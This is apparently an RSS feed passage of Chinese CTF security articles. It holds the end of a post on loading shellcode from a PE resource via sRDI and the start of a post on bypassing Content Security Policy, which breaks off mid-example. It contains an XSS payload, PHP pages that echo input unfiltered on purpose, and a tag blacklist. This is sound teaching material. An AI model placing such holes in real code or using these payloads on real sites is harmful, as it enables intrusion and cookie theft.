src=&quot;https://pic3.zhimg.com/v2-40e368ce9bbaf297bc8386c25c63744a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;500&quot; data-rawheight=&quot;177&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;500&quot; data-original=&quot;https://pic3.zhimg.com/v2-40e368ce9bbaf297bc8386c25c63744a_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-40e368ce9bbaf297bc8386c25c63744a_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;将它们全部加入并打印到文本文件：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$sc2 -join &amp;#34;&amp;#34; &amp;gt; shell.txt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-3050e89a67a0d5d63e16f19667d6afbb_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;677&quot; data-rawheight=&quot;278&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;677&quot; data-original=&quot;https://pic4.zhimg.com/v2-3050e89a67a0d5d63e16f19667d6afbb_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-3050e89a67a0d5d63e16f19667d6afbb_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;677&quot; data-rawheight=&quot;278&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;677&quot; data-original=&quot;https://pic4.zhimg.com/v2-3050e89a67a0d5d63e16f19667d6afbb_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-3050e89a67a0d5d63e16f19667d6afbb_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;使用我们之前获得的 shellcode 创建一个新的二进制文件：&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-8cdcf1f560d9bfadf905f1a3aa1c762d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;761&quot; data-rawheight=&quot;516&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;761&quot; data-original=&quot;https://pic2.zhimg.com/v2-8cdcf1f560d9bfadf905f1a3aa1c762d_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-8cdcf1f560d9bfadf905f1a3aa1c762d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;761&quot; data-rawheight=&quot;516&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;761&quot; data-original=&quot;https://pic2.zhimg.com/v2-8cdcf1f560d9bfadf905f1a3aa1c762d_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-8cdcf1f560d9bfadf905f1a3aa1c762d_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;为了加载和执行 shellcode，我们将把它作为资源放入二进制文件中。从 PE 资源加载和执行 Shellcode：&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-4320f81578d859a2394e1803b464b44c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;638&quot; data-rawheight=&quot;475&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;638&quot; data-original=&quot;https://pic1.zhimg.com/v2-4320f81578d859a2394e1803b464b44c_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-4320f81578d859a2394e1803b464b44c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;638&quot; data-rawheight=&quot;475&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;638&quot; data-original=&quot;https://pic1.zhimg.com/v2-4320f81578d859a2394e1803b464b44c_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-4320f81578d859a2394e1803b464b44c_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;编译并运行二进制文件。如果 shellcode 成功运行，我们应该会看到两个 notepad.exe 进程弹出窗口：&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-625ddec3e4e94820bd640cc5c1c39b6c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1462&quot; data-rawheight=&quot;904&quot; data-thumbnail=&quot;https://pic1.zhimg.com/v2-625ddec3e4e94820bd640cc5c1c39b6c_b.jpg&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1462&quot; data-original=&quot;https://pic1.zhimg.com/v2-625ddec3e4e94820bd640cc5c1c39b6c_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-625ddec3e4e94820bd640cc5c1c39b6c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1462&quot; data-rawheight=&quot;904&quot; data-thumbnail=&quot;https://pic1.zhimg.com/v2-625ddec3e4e94820bd640cc5c1c39b6c_b.jpg&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1462&quot; data-original=&quot;https://pic1.zhimg.com/v2-625ddec3e4e94820bd640cc5c1c39b6c_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-625ddec3e4e94820bd640cc5c1c39b6c_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;有关 &lt;b&gt;sRDI&lt;/b&gt; 的内容就简单介绍到这里。更多有关 CTF 的内容请前往 &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//twosecurity.cn/%3Fquery_ref%3DqGLdXm&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt; 进行学习，最近推出了一系列免费的网络安全技能包，有关CTF、渗透测试、网络攻防、黑客技巧尽在其中，学它涨姿势💯。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;720&quot; data-rawheight=&quot;403&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;720&quot; data-original=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;720&quot; data-rawheight=&quot;403&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;720&quot; data-original=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_b.jpg&quot;/&gt;&lt;/figure&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2019-12-10-96484140</guid>
<pubDate>Tue, 10 Dec 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>CTF|有关CSP绕过的方法</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2019-11-29-94246164.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/94246164&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-e5e1b10290e97ebb1855d6afe10f5721_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;CSP🎫&lt;/h2&gt;&lt;p&gt;&lt;b&gt;0️⃣CSP的由来？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;一个简单的 XSS 漏洞页面，没有对用户的输入进行过滤，就像这样：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;form&amp;gt;
    &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;name&amp;#34; value=&amp;#34;&amp;lt;?php echo $_GET[&amp;#34;name&amp;#34;]; ?&amp;gt;&amp;#34; /&amp;gt;
    &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Submit&amp;#34; /&amp;gt;
&amp;lt;/form&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;对于这样毫无过滤的页面，我们可以轻而易举的进行 XSS。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;#34;/&amp;gt; &amp;lt;script&amp;gt;alert(0)&amp;lt;/script&amp;gt; &amp;lt;!--&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;对于这样的漏洞点来说，我们通常会使用 htmlspecialchars 函数来过滤输入。&lt;/p&gt;&lt;blockquote&gt;htmlspecialchars 函数：将特殊字符转换为 HTML 实体。&lt;/blockquote&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;amp; (AND) =&amp;gt; &amp;amp;amp;
&amp;#34; (双引号) =&amp;gt; &amp;amp;quot;
&amp;#39; (单引号) =&amp;gt; &amp;amp;#039;
&amp;lt; (小于号) =&amp;gt; &amp;amp;lt; 
&amp;gt; (大于号) =&amp;gt; &amp;amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;类似的输入点还有很多很多。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#34;xxx&amp;#34;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;xxx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#34;xxx&amp;#34;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;刚才的 htmlspecialchars 就没有作用了，为了抵御 XSS，我们必须想想其他的方法。&lt;/p&gt;&lt;p&gt;首先是一些特殊符号，比如：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;% * , + – / &amp;lt; = &amp;gt; ^ | ` ; &amp;#34; &amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果将这些符号全部加入黑名单，那正常用户的输入必定会受到限制。&lt;/p&gt;&lt;p&gt;所以程序猿开始使用 htmlspecialchars 函数 + 黑名单 的过滤方法。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;on\w+=
script
iframe
link
svg&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这样做虽然已经很完美了，但是不能防御今后会发生的情况。那么问题来了，可不可以从浏览器的层面来防御 XSS 漏洞呢？&lt;/p&gt;&lt;p&gt;与是 CSP 就这样诞生了🎉&lt;/p&gt;&lt;p&gt;&lt;b&gt;1️⃣什么是CSP？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;CSP 的实质就是白名单机制，对网站加载或执行的资源进行安全策略的控制。&lt;/p&gt;&lt;blockquote&gt;CSP 指的是内容安全策略，为了缓解很大一部分潜在的跨站脚本问题，浏览器的扩展程序系统引入了内容安全策略（CSP）的一般概念。这将引入一些相当严格的策略，会使扩展程序在默认情况下更加安全，开发者可以创建并强制应用一些规则，管理网站允许加载的内容。&lt;/blockquote&gt;&lt;p&gt;简而言之就是个门禁，刷卡才能进。&lt;/p&gt;&lt;p&gt;&lt;b&gt;2️⃣CSP的作用？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;防 XSS 等攻击的利器。&lt;/p&gt;&lt;p&gt;CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。&lt;/p&gt;&lt;p&gt;CSP 大大增强了网页的安全性。攻击者即使发现了漏洞，也没法注入脚本，除非还控制了一台列入了白名单的可信主机。&lt;/p&gt;&lt;p&gt;&lt;b&gt;3️⃣CSP的分类？&lt;/b&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;b&gt;Content-Security-Policy：&lt;/b&gt;配置好并启用后，不符合 CSP 的外部资源就会被阻止加载。&lt;/li&gt;&lt;li&gt;&lt;b&gt;Content-Security-Policy-Report-Only：&lt;/b&gt;表示不执行限制选项，只是记录违反限制的行为。它必须与report-uri选项配合使用。&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;CSP结构🧪&lt;/h2&gt;&lt;p&gt;CSP中常见的header字段为Content-Security-Policy。  一个CSP头由多组CSP策略组成，中间由分号分隔，如下：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;Content-Security-Policy: default-src &amp;#39;self&amp;#39; www.twosecurity.com; script-src &amp;#39;unsafe-inline&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;其中每一组策略包含一个策略指令和一个内容源列表。&lt;/p&gt;&lt;p&gt;&lt;b&gt;策略指令&lt;/b&gt;👇&lt;/p&gt;&lt;p&gt;&lt;b&gt;default-src&lt;/b&gt;&lt;/p&gt;&lt;p&gt;default-src 作为所有其他指令的备用，一般来说 default-src &amp;#39;none&amp;#39;; script-src &amp;#39;self&amp;#39; 这样的情况就会是 script-src 遵循 self，其他的都会使用 none。也就是说，除了被设置的指令以外，其余指令都会被设置为 default-src 指令所设置的属性。&lt;/p&gt;&lt;p&gt;该指令包含了以下指令：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;child-src&lt;/li&gt;&lt;li&gt;connect-src&lt;/li&gt;&lt;li&gt;font-src&lt;/li&gt;&lt;li&gt;img-src&lt;/li&gt;&lt;li&gt;media-src&lt;/li&gt;&lt;li&gt;object-src&lt;/li&gt;&lt;li&gt;script-src&lt;/li&gt;&lt;li&gt;style-src &lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;script-src&lt;/b&gt;&lt;/p&gt;&lt;p&gt;script-src 指令限制了所有 js 脚本可以被执行的地方，包括通过链接方式加载的脚本 url 以及所有内联脚本，甚至包括各种方式的引用。其中还有一个很重要的参数叫 &amp;#39;unsafe-inline&amp;#39;，如果加上这个参数，就不会阻止内联脚本，但这被认为是不安全的。  &lt;/p&gt;&lt;p&gt;对于这个属性有个特殊的配置叫 unsafe-eval，它会允许下面几个函数：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;eval() Function() setTimeout() with an initial argument which is not callable.setInterval() with an initial argument which is not callable.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;关键字👇&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;&amp;#39;none&amp;#39;&lt;/b&gt;&lt;/p&gt;&lt;p&gt;代表空集；即不匹配任何 URL。两侧单引号是必须的。&lt;/p&gt;&lt;p&gt;&lt;b&gt;&amp;#39;self&amp;#39; &lt;/b&gt;&lt;/p&gt;&lt;p&gt;代表和文档同源，包括相同的 URL 协议和端口号。两侧单引号是必须的。&lt;/p&gt;&lt;p&gt;&lt;b&gt;&amp;#39;unsafe-inline&amp;#39; &lt;/b&gt;&lt;/p&gt;&lt;p&gt;允许使用内联资源，如内联的 script 元素、javascript: URL、内联的事件处理函数和内联的 style 元素，两侧单引号是必须的。&lt;/p&gt;&lt;p&gt;&lt;b&gt;&amp;#39;unsafe-eval&amp;#39; &lt;/b&gt;&lt;/p&gt;&lt;p&gt;允许使用 eval() 等通过字符串创建代码的方法。两侧单引号是必须的。 &lt;/p&gt;&lt;p&gt;&lt;b&gt;数据&lt;/b&gt;👇&lt;/p&gt;&lt;p&gt;&lt;b&gt;data: &lt;/b&gt;&lt;/p&gt;&lt;p&gt;允许 data: URI 作为内容来源。这是不安全的，因为攻击者可以精心构造 data: URI 来攻击。请谨慎地使用这个源，并确保不要用于脚本。&lt;/p&gt;&lt;p&gt;&lt;b&gt;mediastream: &lt;/b&gt;&lt;/p&gt;&lt;p&gt;允许 mediastream: URI 作为内容来源。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;Content-Security-Policy: default-src &amp;#39;self&amp;#39;; img-src &amp;#39;self&amp;#39; data:; media-src mediastream:&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;CSP的使用？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;一：在HTTP Header上使用&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;#34;Content-Security-Policy:&amp;#34; #策略
&amp;#34;Content-Security-Policy-Report-Only:&amp;#34; #策略&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;二：在HTML上使用&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;meta http-equiv=&amp;#34;content-security-policy&amp;#34; content=&amp;#34;#策略&amp;#34;&amp;gt;
&amp;lt;meta http-equiv=&amp;#34;content-security-policy-report-only&amp;#34; content=&amp;#34;#策略&amp;#34;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Meta 标签与 HTTP 头只是行式不同而作用是一致的，如果 HTTP 头与 Meta 定义同时存在，则优先采用 HTTP 中的定义。&lt;/p&gt;&lt;p&gt;如果用户浏览器已经为当前文档执行了一个 CSP 的策略，则会跳过 Meta 的定义。如果 META 标签缺少 content 属性也同样会跳过。&lt;/p&gt;&lt;h2&gt;CTF中的CSP绕过💫&lt;/h2&gt;&lt;p&gt;这里简单介绍几种拿 cookie 的绕过思路，没有涉及到的希望大佬们评论区补充完善，小弟感激涕零😭。&lt;/p&gt;&lt;p&gt;CSP：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;twosecurity&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;setcookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;twosecurity&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)));&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;#34;Content-Security-Policy: default-src &amp;#39;self&amp;#39;;&amp;#34;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;CSP&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;CSP&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;twosecurity&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;#34;Your GET content:&amp;#34;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.@&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;twosecurity&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;iframe绕过&lt;/b&gt;&lt;/p&gt;&lt;p&gt;如果有两个页面：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!--a.php--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;twosecurity&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;setcookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;twosecurity&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)));&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;#34;Content-Security-Policy: default-src &amp;#39;self&amp;#39;;&amp;#34;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;CSP&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
